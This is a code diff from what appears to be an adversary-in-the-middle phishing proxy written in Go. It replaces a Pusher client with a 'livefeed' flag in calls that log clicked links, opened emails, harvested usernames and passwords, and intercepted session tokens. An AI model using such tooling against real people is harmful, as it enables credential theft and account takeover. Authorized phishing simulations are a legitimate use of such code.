@@ -72,7 +72,7 @@ type HttpProxy struct {
     ip_sids           map[string]string
     auto_filter_mimes []string
     ip_mtx            sync.Mutex
-    PusherClient      database.Pusher
+    livefeed		  bool
 }
 
 type ProxySession struct {
@@ -82,7 +82,7 @@ type ProxySession struct {
     Index       int
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, pc database.Pusher) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool, livefeed bool) (*HttpProxy, error) {
     p := &HttpProxy{
         Proxy:             goproxy.NewProxyHttpServer(),
         Server:            nil,
@@ -96,7 +96,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
         ip_whitelist:      make(map[string]int64),
         ip_sids:           make(map[string]string),
         auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
-        PusherClient:       pc,
+        livefeed:          livefeed,
     }
     
     p.Server = &http.Server{
@@ -180,14 +180,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             if len(rid_match) != 0 && len(opened_match) == 0 {
                 rid = strings.Split(rid_match, "=")[1]
                 browser = map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
-                err := database.HandleClickedLink(rid, browser, p.PusherClient)
+                err := database.HandleClickedLink(rid, browser, p.livefeed)
                 if err != nil {
                     log.Error("failed to add clicked link event to database: %s", err)
                 }
             } else if len(rid_match) != 0 && len(opened_match) != 0 {
                 rid = strings.Split(rid_match, "=")[1]
                 browser = map[string]string{"address": req.RemoteAddr, "user-agent": req.UserAgent()}
-                err := database.HandleEmailOpened(rid, browser, p.PusherClient)
+                err := database.HandleEmailOpened(rid, browser, p.livefeed)
                 if err != nil {
                     log.Error("failed to add email opened event to database: %s", err)
                 }
@@ -479,7 +479,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     }
                                     session := p.sessions[ps.SessionId]
                                     if len(session.RId) != 0 {
-                                        err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.PusherClient)
+                                        err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
                                         if err != nil {
                                             fmt.Printf("Error submitting data to database: %s\n", err)
                                         }
@@ -533,7 +533,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                             }
                                             session := p.sessions[ps.SessionId]
                                             if len(session.RId) != 0 {
-                                                err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.PusherClient)
+                                                err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
                                                 if err != nil {
                                                     fmt.Printf("Error submitting data to database: %s\n", err)
                                                 }
@@ -750,7 +750,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 // we have all auth tokens
                 if s, ok := p.sessions[ps.SessionId]; ok && len(s.RId) != 0 {
                     log.Success("[%d] all authorization tokens intercepted!", ps.Index)
-                    err = database.HandleCapturedSession(s.RId, s.Tokens, s.Browser, p.PusherClient)
+                    err = database.HandleCapturedSession(s.RId, s.Tokens, s.Browser, p.livefeed)
                     if err != nil {
                         fmt.Printf("Error adding captured session entry to database: %s\n", err)
                     }
@@ -881,7 +881,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                             if err == nil {
                                 log.Success("[%d] detected authorization URL - tokens intercepted: %s", ps.Index, resp.Request.URL.Path)
                                 if len(s.RId) != 0 {
-                                    err = database.HandleCapturedSession(s.RId, s.Tokens, s.Browser, p.PusherClient)
+                                    err = database.HandleCapturedSession(s.RId, s.Tokens, s.Browser, p.livefeed)
                                     if err != nil {
                                         fmt.Printf("Error adding captured session entry to database: %s\n", err)
                                     }
